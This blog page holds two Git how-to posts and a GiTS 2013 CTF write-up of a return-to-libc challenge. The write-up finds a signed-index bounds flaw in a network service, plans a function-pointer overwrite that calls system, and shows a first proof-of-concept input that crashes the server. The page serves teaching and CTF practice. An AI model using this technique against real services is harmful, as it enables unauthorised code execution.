razvan@einherjar:~/school/current/saisp/repo$ git status
# On branch br-2010-2011
nothing to commit (working directory clean)</code></pre>
<p>This allows easy organization of your tree, with no need to create other folders (one for each year). If you want to access information for a given year, you would just create a new branch.</p>
<p>This isn’t the case for the current <a href="https://github.com/rosedu/cdl" title="CDL repository">CDL repository</a>. I’m not particularly happy with it and will probably update it soon. As we weren’t very Git aware at the time we’ve created the repository, we started using a folder for each year:</p>
<pre><code>razvan@einherjar:~/projects/rosedu/cdl/repo.git$ ls
2009  2010  2011  2012  2013  Makefile  curs1  git_tutorial  template  util</code></pre>
<p>This is unnecessary and results in duplicate information, copied from one year to the other.</p>
<p>The solution is pretty simple: identify the last commit for each CDL session/year, tag it and then, if required create branches out of it.</p>
<p>Identifying the last commit for each CDL session is easily done through <code>gitk</code>. Browse the commits, look at the dates, identify the last commit and create a tag:</p>
<pre><code>razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git tag 2009 e9858a9e74
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git tag 2010 26cd285f47
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git tag 2011-spring eaa2d7e9a8
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git tag 2011-fall f69e679ebd
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git tag 2012 fd23db9181</code></pre>
<p>Afterwards, we can create branches for each of them to easily go to that point:</p>
<pre><code>razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git branch br-2012 2012
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git branch br-2011-fall 2011-fall
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git branch br-2011-spring 2011-spring
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git branch br-2010 2010
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git branch br-2009 2009
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git branch
  br-2009
  br-2010
  br-2011-fall
  br-2011-spring
  br-2012
* master
  old-master
  razvan</code></pre>
<p>Of course, it would only makes sense to really clear the repository and turn it into a “normal” one that only stores current information. Remove old year data and show only current one:</p>
<pre><code>razvan@einherjar:~/projects/rosedu/cdl/repo.git$ ls
2009  2010  2011  2012  2013  Makefile  curs1  git_tutorial  template  util
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git rm -r 2009
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git rm -r 2010
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git rm -r 2011
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git rm -r 2012
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git mv 2013/* .
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ rmdir 2013
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ ls
Makefile  curs1  curs3  git.mm  git_tutorial  schelet_inscriere  template  util
razvan@einherjar:~/projects/rosedu/cdl/repo.git$ git commit -m 'Clear folder structure. Leave only current items'</code></pre>
<p>All is now nice and clear. Any updates are going to be done on the current folder structure; any request to see old data can be handled by checking out one of the branches.</p>
<h2 id="branches-on-a-virtual-machine">Branches on a Virtual Machine</h2>
<p>In our experience we come to situations when required to work on the desktop/laptop and on a virtual machine. Of course, we are using Git for storing code. It would only make sense for one repository to be a remote for another one. The case is that, with Git, every repository can be a remote.</p>
<p>As such, I usually create a clone of the laptop repository on the virtual machine. I usually do that with the <a href="http://ocw.cs.pub.ro/courses/so2/" title="SO2">SO2</a> repository when updating lab tasks or assignment solutions and tests. The laptop stores the main repository and the virtual machine uses a clone of that:</p>
<pre><code>root@spook:~# git clone razvan@einherjar.local:school/current/so2/git-repos/lab lab.git
root@spook:~# cd lab.git/
root@spook:~/lab.git# git remote show origin
* remote origin
  Fetch URL: razvan@einherjar.local:school/current/so2/git-repos/lab
  Push  URL: razvan@einherjar.local:school/current/so2/git-repos/lab
[...]</code></pre>
<p>In order to work properly on the remote you would need to use a dedicated branch to push information. You’ll have problems if you push to the master branch of a repository that is using the master branch itself. I usually dub this ‘vm’ (for virtual machine):</p>
<pre><code>root@spook:~/lab.git# git checkout -b vm
Switched to a new branch 'vm'</code></pre>
<p>Any further changes are going to be committed in the ‘vm’ branch. Subsequently you would push these commits to the main repository, on the laptop:</p>
<pre><code>root@spook:~/lab.git# git push origin vm
Total 0 (delta 0), reused 0 (delta 0)
To razvan@einherjar.local:school/current/so2/git-repos/lab
 * [new branch]      vm -&gt; vm</code></pre>
<p>On the main repository, you would just merge or rebase your changes from that branch:</p>
<pre><code>razvan@einherjar:~/school/current/so2/git-repos/teme$ git rebase vm
First, rewinding head to replay your work on top of it...
Fast-forwarded master to vm.</code></pre>
<p>At this moment, all changes in the repository clone on the virtual machine are present in the master branch on the repository on the laptop. You need to create a separate branch on the virtual machine clone and then push that branch to the main repository. If you would work on the master branch on the virtual machine clone and push that, it would be problematic to integrate those changes in the master branch on the main repository.</p>
<h2 id="going-after-cherries">Going After Cherries</h2>
<p>In some cases, when working with multiple branches, it might happen that you need a specific commit from one branch but you don’t want to merge that branch into your current one.</p>
<p>Fortunately, Git allows you to pick a single commit as easy as picking cherries from a cherry-tree. In fact, the command is <code>git cherry-pick</code>.</p>
<pre><code>$ git cherry-pick 1904c3d4c9720
[master 3a30153] File to be cherry-picked in master.
 Author: Andrei Petre &lt;p31andrei@gmail.com&gt;
 1 file changed, 0 insertions(+), 0 deletions(-)
 create mode 100644 file_to_get_in_master</code></pre>
<p>Now, you have a <strong>new</strong> commit with the same change as the picked-up commit but on your branch</p>
<pre><code>$ git log
commit 3a3015378c3c1b43c4895a00829034d53fb9a5b5
Author: Andrei Petre &lt;p31andrei@gmail.com&gt;
Date:   Fri Mar 8 23:59:07 2013 +0200

    File to be cherry-picked in master.</code></pre>
<p>As you can see, the commit hash is different meaning that there is a new commit, not the old one.</p>
<p>Should a commit not apply cleanly, Git stops the cherry-picking process and asks for human intervention. After the problems are resolved, you can continue it with <code>git cherry-pick --continue</code>. Or, you can abort it via <code>--abort</code> if you change your mind after seeing the trouble.</p>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./git-is-the-answer-1.html" title="Git Is The Answer 1/3">Git Is The Answer 1/3</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on March 18, 2013</span>
            by
            <span class="author">Răzvan Deaconescu and Mihai Maruseac</span>
            </span>

            <p>We focus again on <a href="http://git-scm.com/" title="Git">git</a>. This time, we will present some real-world scenarios where knoweldge of advance git topics helps. In order to keep down the length of the article, our presentation is divided in 3 parts, this being the first one of these.</p>
<h2 id="user-setup">User Setup</h2>
<p>After installing Git and before doing any commits into a repository, you must setup your user information and preferences. It is common to make a global configuration, using <code>git config</code>:</p>
<pre><code>git config --global user.name &quot;Razvan Deaconescu&quot;
git config --global user.email &quot;razvan.deaconescu@cs.pub.ro&quot;
git config --global color.ui auto</code></pre>
<p>You should make this setup for each account you are using. At the minimum, you are going to use it at least for your laptop or workstation.</p>
<p>Global configuration is stored in <code>~/.gitconfig</code>.</p>
<p>In case you want to use another username within a repository, use the <code>git config</code> command in that repository, but without the <code>--global</code> option:</p>
<pre><code>cd /path/to/repository.git
git config user.email &quot;razvan@rosedu.org&quot;</code></pre>
<p>In the above setup, I have only updated the email address for the repository. The other options used are picked from the global configuration.</p>
<p>Per repository configuration is stored in <code>/path/to/repository.git/.config</code>.</p>
<h2 id="handling-line-endings-like-a-pro">Handling Line Endings Like a Pro</h2>
<p>From time to time it is possible that you will have to work with people working on a different operating system. It is no problem if both of you are using systems with similar line-endings (<code>CRLF</code> for Windows, <code>LF</code> for Linux/OSX). In all other cases, it might be that the default Git options used for this don’t work for you.</p>
<p>You can configure Git globally to handle line-endings if you set the <code>core.autocrlf</code> option in your <code>~/.gitconfig</code>. However, the best settings are different on different platforms.</p>
<p>For Windows you would use</p>
<pre><code>git config --global core.autocrlf true</code></pre>
<p>While for Linux/OSX you would use</p>
<pre><code>git config --global core.autocrlf input</code></pre>
<p>You must remember that these changes are valid only for you, and for the operating systems which have these settings configured. To have the settings travel with the repository you have to go a different path: you have to create a <code>.gitattributes</code> file with a content similar to</p>
<pre><code>* text=auto
*.c text
*.h text
*.sln text eol=crlf
*.png binary
*.jpg binary</code></pre>
<p>The first line tells git to handle the line endings of all <strong>text</strong> files automatically. The second two lines declare that <code>.c</code> and <code>.h</code> files are to be treated as text (thus their line endings are to be converted to the proper format). The <code>.sln</code> line uses a new parameter (<code>eol=crlf</code>) which tells Git to normalize files on commit but to always checkout them with <code>CRLF</code> endings. Use this for files which need to have <code>CRLF</code> endings, even on Linux. A similar settings exists for <code>LF</code> endings.</p>
<p>Finally, there are cases when you need to commit binary files into the repository. In this cases, changing <code>LF</code> characters to <code>CRLF</code> or the reverse will break the binary. You have to tell Git not to handle them, thus you’ll specify <code>binary</code> in <code>.gitattributes</code> file.</p>
<p>If the repository already contained some files commited, after creating the <code>.gitattributes</code> file each of you will have files show up as modified, even if they haven’t changed. This is because of the line endings changes which was not followed by repository renormalization. To solve this, you have to do the following steps (on a <strong>clean</strong> repository, otherwise changes will be lost).</p>
<p>First, remove everything from the index and reset both the index and the working directory (the risky part):</p>
<pre><code>git rm --cached -r .
git reset --hard</code></pre>
<p>Finally, stage all files which were normalized and create a normalizing commit</p>
<pre><code>git add .
git commit -m &quot;Normalized line endings&quot;</code></pre>
<p>From now on, Git will properly do the job of handling line endings for you.</p>
<h2 id="how-to-create-and-setup-a-local-repo">How to Create and Setup a Local Repo</h2>
<p>One of the best features of Git is the ability to rapidly create and use local repositories. You don’t have to create a repository and then clone it locally as you do in Subversion. You just create or access a directory and then initialize it as a Git repository. Changes to files in the directory will be able to be handled as commits.</p>
<p>Assuming I am working on a personal project, the first thing I would do is create a directory and initialize it as a Git repository. I recommend you append the <code>.git</code> extension:</p>
<pre><code>mkdir ~/projects/troscot.git
git init ~/projects/troscot.git</code></pre>
<p>The first thing you add in a repository is a <code>.gitignore</code> file stating the files you wish to ignore. Such a sample file is <a href="https://github.com/razvand/snippets/blob/master/config/gitignore" title="gitignore file">here</a>.</p>
<p>You just create the <code>.gitignore</code> file in the repository root and then add it to the repository:</p>
<pre><code>vi .gitignore
git add .gitignore
git commit -m 'Initial commit. Add global .gitignore file'</code></pre>
<p>After this, one would create, add and commit any files required.</p>
<p>Another use case is adding repository support for existing directories. This may happen when there is some pieces of code you already have in place and want to place in a repository or, my personal use case, adding repository support to configuration directories. For example, if one would want to use versioning for Apache2 configuration files, one would issue (as <code>root</code>):</p>
<pre><code>cd /etc/apache2/
git init .
vi .gitignore
git add .gitignore
git commit -m 'Initial commit. Add global .gitignore file'
git add .
git status
git commit -m 'Initial commit. Add all config files to repository'</code></pre>
<p>The above commands add a <code>.gitignore</code> file in the repository and then add all Apache2 configuration files. The <code>git status</code> command is always necessary after a <code>git add</code> command to make sure you are committing the right stuff; you may need to update your <code>.gitignore</code> file in case you’ve missed ignoring certain types of files.</p>
<h2 id="i-want-to-tweak-a-commit">I Want To Tweak A Commit</h2>
<p>From time to time you realize that you have made something wrong with a commit. Either you forgot to add a good, descriptive <a href="http://tbaggery.com/2008/04/19/a-note-about-git-commit-messages.html" title="A Note About Git Commit Messages">message</a> or you have really screwed up some parts of the committed code. Maybe you have some compile errors to fix or your commit does too many things at once.</p>
<p>Anyway, for all of these cases, Git allows you to rewrite the commit at will. You can add changes of tweak metadata (author name, commit message, etc.) just by issuing the needed commands and ending with</p>
<pre><code>git commit --amend</code></pre>
<p>However, this works only for the tip of the current branch. If you want to change a commit which is not HEAD, you’ll need to do a rebase process. This will temporarily move HEAD to the commit you want to change, allowing you to use the above procedure. It is best to start the rebase interactively, so that you can have great control over what it does:</p>
<pre><code>git rebase -i cf80a4ad6d64bff2</code></pre>
<p>The above will open your editor (configurable via <code>git config</code>) with a content similar to the following one (you can see it on the disk if you really want to, it is in the repository, in <code>.git/rebase/git-rebase-todo</code>)</p>
<pre><code>pick 899e7e6 Add Silviu's contributions.
pick 02f1ef9 Add contribs to Cristian Mocanu.
pick 98194cd Add contributions of Andru Gheorghiu.
pick 2931f1d Add 2 contributions of spopescu.

# Rebase cf80a4a..2931f1d onto cf80a4a
#
# Commands:
#  p, pick = use commit
#  r, reword = use commit, but edit the commit message
#  e, edit = use commit, but stop for amending
#  s, squash = use commit, but meld into previous commit
#  f, fixup = like &quot;squash&quot;, but discard this commit's log message
#  x, exec = run command (the rest of the line) using shell
#
# These lines can be re-ordered; they are executed from top to bottom.
#
# If you remove a line here THAT COMMIT WILL BE LOST.
#
# However, if you remove everything, the rebase will be aborted.
#
# Note that empty commits are commented out</code></pre>
<p>As you can see, you can select an action to be applied for each one of the commits. If you only want to edit the commit message, you will change <code>pick</code> with <code>reword</code> (or <code>r</code>). If you want to edit the content of the commit you will select <code>edit</code>. You can even reorder commits, squash them one a bigger one, etc.</p>
<p>For now, we will focus on editing the contents of one commit. We will change last line in <code>edit</code>.</p>
<pre><code>e 2931f1d Add 2 contributions of spopescu.</code></pre>
<p>The rebase process continues and tries to do what we’ve said it to do. In our case, it will stop at commit <code>2931f1d</code> to allow editing it:</p>
<pre><code>Stopped at 2931f1d... Add 2 contributions of spopescu.
You can amend the commit now, with

    git commit --amend

Once you are satisfied with your changes, run

    git rebase --continue</code></pre>
<p>Now, you can add or remove content, change the commit as you want, etc. Then, you continue the rebase process by running <code>git commit --amend</code> followed by <code>git rebase --continue</code>. Both of them are needed.</p>
<p>If you decide that the commit is ok and that the rebase was not neeeded, you can always abort it with <code>git rebase --abort</code>.</p>
<p>Finally, keep in mind that <strong>it is not recommended to change commits once they have been pushed to another repository.</strong></p>
<h2 id="but-my-commit-is-too-big">But My Commit Is Too Big</h2>
<p>From time to time, you will have some big changes to commit. However, the case when all of them are atomic and cannot be split into several shorter components is very rare. Let’s take for our example a LaTeX Beamer file. You can commit each section separately or even each slide, as you see fit. But how can you split the commit?</p>
<p>Actually, you can use two commands for this. One is <code>git add -i</code> to allow interactive adding of parts of commits. The second one is to use <code>git add -p</code> which is more simpler.</p>
<p>Running <code>git add -p</code> will present you with the first chunk of changes to be committed. It might be the case that this is chunk is atomic or not. Git offers this question after presenting the hunk:</p>
<pre><code>Stage this hunk [y,n,q,a,d,/,e,?]?</code></pre>
<p>Selecting <code>?</code> will print the help text and the chunk afterwards. The help text is</p>
<pre><code>y - stage this hunk
n - do not stage this hunk
q - quit; do not stage this hunk nor any of the remaining ones
a - stage this hunk and all later hunks in the file
d - do not stage this hunk nor any of the later hunks in the file
g - select a hunk to go to
/ - search for a hunk matching the given regex
j - leave this hunk undecided, see next undecided hunk
J - leave this hunk undecided, see next hunk
k - leave this hunk undecided, see previous undecided hunk
K - leave this hunk undecided, see previous hunk
s - split the current hunk into smaller hunks
e - manually edit the current hunk
? - print help</code></pre>
<p>Now, you can use these options to split your commit or edit it. Editing is the most advanced feature of <code>git add -p</code>, the only one who needs more explaining. So let’s choose this.</p>
<pre><code>Stage this hunk [y,n,q,a,d,/,e,?]? e</code></pre>
<p>Again, we will be presented with an editor to edit the contents of <code>.git/addp-hunk-edit.diff</code>. The comment at the end of the file is self-explanatory:</p>
<pre><code># To remove '-' lines, make them ' ' lines (context).
# To remove '+' lines, delete them.
# Lines starting with # will be removed.
#
# If the patch applies cleanly, the edited hunk will immediately be
# marked for staging. If it does not apply cleanly, you will be given
# an opportunity to edit again. If all lines of the hunk are removed,
# then the edit is aborted and the hunk is left unchanged.</code></pre>
<p>The <code>-</code> lines are lines which will be removed by the commit and the <code>+</code> ones will be added. Thus, if you remove a <code>+</code> line, the commit will not contain the addition and if you mark one <code>-</code> line as context it won’t be removed by the commit.</p>
<p>Since <code>git add -p</code> is a powerful feature, it is advisable to have it added as an alias, via <code>git config</code>. For example, I have <code>git gap</code> do the same thing as <code>git alias -p</code>. Then, it is in my muscles’ memory to type <code>git gap</code> when adding changes for a new commit.</p>
<h2 id="i-dont-want-this-commit-anymore">I Don’t Want This Commit Anymore</h2>
<p>There is often the case that you want to rollback a change you’ve done. As long as everything is happening locally (i.e. you haven’t pushed to a remote repository), Git offers the proper tools to handle this.</p>
<p>Assume you’ve updated a file but you want to discard those changes. You’ve just done some tests and feel those are not required and want to get back to the initial version. Then you would issue</p>
<pre><code>git checkout file-name</code></pre>
<p>This above command restores the file to the repository version. It’s very useful in case you make a mess in a local file.</p>
<p>A quite often situation is preparing to make a commit. When you do that you use one or more <code>git add</code> commands to prepare the commit; sometimes you use a <code>git add .</code> command that gives you little control on what to add to the staging area. You find out that you’ve added too much content to the staging area. In order to remove that extra content from the staging area (and leave it in the working directory), one issues:</p>
<pre><code>git reset HEAD file-name</code></pre>
<p>If you want to start building your commit from the beginning and discard all information in the staging area, you would use:</p>
<pre><code>git reset HEAD</code></pre>
<p>When leaving out the file name, all content from the staging area is discarded.</p>
<p>Consider that you’ve done some bad commits and you’ve just found out. The last two commits are really bad and need to be dropped. As long as you haven’t pushed anything, you can rework those commits: you can reset the repository HEAD and leave the commit changes in the working directory. If we want to redo the last two commits we would just issue:</p>
<pre><code>git reset HEAD^^</code></pre>
<p>Remember, this doesn’t remove the commit changes. The repository HEAD is simply moved back and the commit changes are left in the working directory; you will then use them to create proper new commits.</p>
<h2 id="i-want-to-change-this-file-silently">I Want To Change This File Silently</h2>
<p>GitHub has an excellent article on <a href="https://help.github.com/articles/ignoring-files" title="GitHub: Ignoring files">ignoring files</a>. A particular situation is ignoring updates to files that are already in the repository (i.e. they’ve been previously commited and can’t be ignored using .gitignore).</p>
<p>This kind of situation is part of my repository with letters of recommendation. I’m using a Makefile for compiling out a letter and have isolated in it some variables:</p>
<pre><code>$ cat Makefile
PERSON = Alexandru_Juncu
FOLDER = alexandru-juncu

include base.mk</code></pre>
<p>When I would create a new recommendation I update the <code>Makefile</code> to compile it. However this change needn’t make it to the repository. If I would do that then each time I’m only compiling out an old letter of recommendation I would change the Makefile file and push the new changes; or, if I don’t want to push those changes, I would need to use <code>git checkout</code>.</p>
<p>The best solution would be for any updates to the Makefile to not be considered. The initial Makefile file would be stored in the repository (as a model) but subsequent changes should not be visible. This can be done by using:</p>
<pre><code>git update-index --assume-unchanged Makefile</code></pre>
<p>No changes on the <code>Makefile</code> file are going to be considered in the working directory.</p>
<p>If you want to revert this option, use:</p>
<pre><code>git update-index --no-assume-unchanged Makefile</code></pre>

          </div>
        </div>
      </div>
    </article>
  </div>
</div>


  <div class="unit-inner unit-body-inner">
  <div class="entry-content">
    <article class="unit-article layout-post">
      <div class="unit-inner unit-article-inner">
        <div class="content">
          <div class="bd">
            <header>
              <div class="unit-head">
                <div class="unit-inner unit-head-inner">
                  <h1 class="h2 entry-title">
                    <a class="post_title" href="./ctf-return-to-libc.html" title="GiTS 2013 CTF -- return-to-libc -- pwnable 250">GiTS 2013 CTF -- return-to-libc -- pwnable 250</a>
                  </h1>
                </div><!-- unit-inner -->
              </div><!-- unit-head -->
            </header>

            <span class="date">
            <span class="published">Published on February 19, 2013</span>
            by
            <span class="author">Lucian Cojocar</span>
            </span>

            <h1 id="introduction">Introduction</h1>
<p>This is a write-up for Pwnable 250 level from <a href="http://ghostintheshellcode.com/" title="Ghost in the Shellcode CTF">Ghost in the Shellcode</a> capture the flag competition. Basically a return-to-libc attack will be described; we will also describe the steps for solving the mentioned CTF level using the <a href="res/back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f" title="Vulnerable binary">original binary</a> from the competition.</p>
<h1 id="hello-binary">Hello binary!</h1>
<p>Let’s start by inspecting the binary.</p>
<ul>
<li><p>32bit dynamically linked binary</p>
<pre><code>$ file ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f: ELF 32-bit LSB executable, ...</code></pre></li>
<li><p>it waits for connections on port 31337</p>
<pre><code>$ strace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
	[...]
setsockopt(3, SOL_SOCKET, SO_REUSEADDR, [1], 4) = 0
bind(3, {sa_family=AF_INET, sin_port=htons(31337), sin_addr=inet_addr(&quot;0.0.0.0&quot;)}, 16) = 0
listen(3, 20)                           = 0
accept(3, </code></pre></li>
</ul>
<p><code>SO_REUSEADDR</code> is used, just for <em>easy</em> debugging ;-) - it allows other sockets to <code>bind()</code> this port; no more getting the annoying error <em>Address already in use</em> after the server crashes.</p>
<pre><code>	$ telnet localhost 31337
	Trying ::1...
	Trying 127.0.0.1...
	Connected to localhost.
	Escape character is '^]'.
	Connection closed by foreign host.
	$</code></pre>
<p>It immediately drops connection.</p>
<p>Let’s have a look at what happens when we are connecting to it.</p>
<pre><code>	$ ltrace -f ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f
	[...]
	[pid 4359] accept(3, 0, 0, 0x697a0002, 1)                                           = 4
	[pid 4359] fork()                                                                   = 4361
	[pid 4359] close(4)                                                                 = 0
	[pid 4359] accept(3, 0, 0, 0x697a0002, 1 &lt;unfinished ...&gt;
	[pid 4361] &lt;... fork resumed&gt; )                                                     = 0
	[pid 4361] getpwnam(&quot;back2skool&quot;)                                                   = NULL
	[pid 4361] err(-1, 0x804997b, 0x80499b8, 0, 0back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f:
	Failed to find user back2skool: Success
	 &lt;unfinished ...&gt;
	[pid 4361] +++ exited (status 255) +++</code></pre>
<p>In short, <code>getpwnam</code> fails, and the forked child exits. It also prints a conclusive error - the user <code>back2skool</code> is required.</p>
<p>Usually, the <em>first</em> step, when trying to solve a remote challenge is to debug it locally. Of course this is possible as long as we can run the application ourselves.</p>
<p>After we setup the user we can see the following output when connecting:</p>
<pre><code>	$ telnet localhost 31337
	Trying ::1...
	Trying 127.0.0.1...
	Connected to localhost.
	Escape character is '^]'.
	    __  ___      __  __   _____
	   /  |/  /___ _/ /_/ /_ / ___/___  ______   __ v0.01
	  / /|_/ / __ `/ __/ __ \\__ \/ _ \/ ___/ | / /
	 / /  / / /_/ / /_/ / / /__/ /  __/ /   | |/ /
	/_/  /_/\__,_/\__/_/ /_/____/\___/_/    |___/
	===============================================
	Welcome to MathServ! The one-stop shop for all your arithmetic needs.
	This program was written by a team of fresh CS graduates using only the most
	agile of spiraling waterfall development methods, so rest assured there are
	no bugs here!
	
	Your current workspace is comprised of a 10-element table initialized as:
	{ 0, 1, 2, 3, 4, 5, 6, 7, 8, 9 }
	
	Commands:
		read	Read value from given index in table
		write	Write value to given index in table
		func1	Change operation to addition
		func2	Change operation to multiplication
		math	Perform math operation on table
		exit	Quit and disconnect
	exit
	Exiting program!
	Connection closed by foreign host.
	$</code></pre>
<h1 id="the-vulnerability">The vulnerability</h1>
<h4 id="high-level">High-level</h4>
<p>The output of the program is self-explanatory. Let’s try some commands.</p>
<pre><code>$ telnet localhost 31337
read
Input position to read from:
3</code></pre>
<p>Nothing special.</p>
<pre><code>Input position to read from:
10
Value at position 10: 134519224</code></pre>
<p>We can read <strong>past</strong> our table!</p>
<pre><code>Input position to read from:
-200
Value at position -200: 0</code></pre>
<p>We can read <strong>below</strong> our table!</p>
<pre><code>read
Input position to read from:
90000
Connection closed by foreign host.</code></pre>
<p>The program received <code>SIGSEGV</code> and the socket was closed. At least we can crash the program; in fact we are only crashing the child that has been spawned to handle our connection.</p>
<p>But what about write?</p>
<pre><code>$ telnet localhost 31337
write
Input position to write to:
0
Input numeric value to write:
1
Value at position 0: 1</code></pre>
<p>Nothing special.</p>
<pre><code>write
Input position to write to:
10
Table index too large!</code></pre>
<p>Bummer, we cannot <strong>write past</strong> our table!</p>
<pre><code>write
Input position to write to:
-1
Input numeric value to write:
42
Value at position -1: 42
write
Input position to write to:
-10000 
Input numeric value to write:
999
Connection closed by foreign host.</code></pre>
<p>Heh, we can <strong>write below</strong> our table!</p>
<h4 id="low-level">Low-level</h4>
<p>The assembly code, responsible for checking the indices can be viewed below. <img style="float:center" src="./images/ida-atoi-read.png" alt="Read - atoi" /></p>
<p>As you can <em>not</em> see, there is no check code for the index when we’re doing a <em>read</em> operation.</p>
<p><img style="float:center" src="./images/ida-atoi-write.png" alt="Write - atoi" /></p>
<p>For the <em>write</em> operation there is checking using the instruction <code>jle</code>. But <code>jle</code> instruction is used for comparing <em>signed</em> integers. The instruction <code>jbe</code> should be used in this case which compares <em>unsigned</em> integers. You can find more on this <a href="http://en.wikibooks.org/wiki/X86_Assembly/Control_Flow#Jump_if_Less">wiki article</a>. Probably the original code looks something like this:</p>
<p>{% highlight cpp %} int i; i = atoi(str); if (i &gt; 9) { error(); exit(); } do_stuff; {% endhighlight %}</p>
<p>One way to correct the above code is to have an unsigned comparison or check for negative values. Both would work in this case, but then we couldn’t solve this level :-).</p>
<p>In short, the <strong>index checking</strong> is <strong>broken</strong>. We can use any index for the <strong>read</strong> operation and for the <strong>write</strong> only negative indices. When you can write anything to any address of a program, the rest is just implementation.</p>
<h1 id="the-exploit">The exploit</h1>
<p>As explained in the previous section we can modify <em>almost</em> any address from our vulnerable program. In order to choose a right way to exploit the vulnerability, we should gather more information about the environment.</p>
<h3 id="do-we-have-any-rwx-place-to-store-the-payload">Do we have any RWX place to store the payload?</h3>
<pre><code>$ readelf -e ./back2skool-3fbcd46db37c50ad52675294f566790c777b9d1f 
ELF Header:
  Magic:   7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 
[...]

Program Headers:
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
      [Requesting program interpreter: /lib/ld-linux.so.2]
  LOAD           0x000000 0x08048000 0x08048000 0x022a8 0x022a8 R E 0x1000
  LOAD           0x002e68 0x0804be68 0x0804be68 0x00204 0x00214 RW  0x1000
  DYNAMIC        0x002e7c 0x0804be7c 0x0804be7c 0x000d8 0x000d8 RW  0x4
  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
  GNU_EH_FRAME   0x001e94 0x08049e94 0x08049e94 0x000c4 0x000c4 R   0x4
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RW  0x4
  GNU_RELRO      0x002e68 0x0804be68 0x0804be68 0x00198 0x00198 R   0x1
[...]</code></pre>
<p>The short answer is <strong>no</strong> - there is no <code>RWE</code> section in the binary. We cannot modify a memory that will be executed later. Maybe we can put our exploit in some region and then make this region executable. This means that we should be able to call <code>mprotect</code> or <code>mmap</code>. But we’ll have to do this, without injecting code, but only by changing non-executable data - e.g. stack values. One idea is to use a <a href="http://en.wikipedia.org/wiki/Return-oriented_programming">return-oriented-programming (ROP) approach</a>, but as you will see in a future section, because our program doesn’t use <code>mprotect</code> or <code>mmap</code> (from libc), calling those functions means that we will have to figure out the offsets of those functions in libc first - if we do this, we can have a more straightforward approach by calling <code>system</code> function directly.</p>
<h3 id="is-aslr-enabled">Is ASLR enabled?</h3>
<p>It is safe to assume that <a href="http://en.wikipedia.org/wiki/Address_space_layout_randomization#Linux">ASLR</a> is enabled. But because we will use some sort of ROP, we don’t care too much about this right now.</p>
<h3 id="where-shall-we-write">Where shall we write?</h3>
<p>In order to modify the flow control of the program by only changing non-executable memory, we will have to find an <strong>indirect jump</strong> and change the value from that specific address. <a href="http://althing.cs.dartmouth.edu/secref/resources/plt-got.txt">GOT</a> is the starting point for this.</p>
<p>The idea that comes to our mind is: we will write (override) an address of function which is called later from the GOT. The GOT table is always at the same place in the memory (it resides in the binary) but recall, that we’re writing relatively to a buffer (the workspace table). So the next question that comes in our mind is:</p>
<h3 id="do-we-know-the-address-of-the-buffer">Do we know the address of the buffer?</h3>
<p>There are three cases where the buffer might be located: * on the stack. If ASLR is enabled, figuring out its address can be done by reading an old <code>%ebp</code>, which is possible because we can read parts of the memory relative to the buffer address; * on the heap. This is harder to get. But if our buffer is on the heap, and we can alter structures that are used internally by the malloc function (and we can, because the negative offset write) there is a way of exploiting. We can do something like in the case of <a href="https://www.owasp.org/index.php/Double_Free">double-free vulnerability</a> - but it would be a tedious job; * declared global (<code>.bss</code> or <code>.data</code> section). The address of the buffer is the same as in the binary, no runtime hazards.</p>
<p>Probably because pwn250 is <strong>not</strong> the hardest level, the buffer is in the <code>.data</code> section.</p>
<p><img style="float:center" src="./images/ida-values.png" alt="Values buffer" /></p>
<p>Because our buffer is in <code>.data</code> section and we can use negative indices for read and write, we have a <strong>good</strong> control over the memory <strong>below</strong> our buffer. Moreover, you can see in the <a href="https://www.hex-rays.com/products/ida/index.shtml">IDA</a> screenshot above, that there’s a <code>math</code> variable. The program is capable of switching from one operation (addition) to another one (multiplication) it does so by changing a pointer to a function. The pointer is in the <code>.bss</code> section.</p>
<p><img style="float:center" src="./images/ida-indirect-jump.png" alt="Indirect jump via math_ptr" /></p>
<p>I know at this point, one might argue that the authors of the program used this pointer to facilitate the problem solving - it’s true I wouldn’t argue against this - it’s just a game.</p>
<p>So <strong>let’s state our idea</strong>: we will override a pointer to a function which is called later; the function will be called whenever the <code>math</code> function is called.</p>
<h2 id="first-poc">First <a href="http://en.wikipedia.org/wiki/Proof_of_concept">PoC</a></h2>
<pre><code>$ telnet localhost 31337
[...]
math
You haven't set a mode yet!
func1
Setting mode to ADDITION
write
Input position to write to:
-2147483634
Input numeric value to write:
286331153
Value at position -2147483634: 286331153
math
Connection closed by foreign host.
$</code></pre>
<p>Meanwhile, back at the castle.</p>
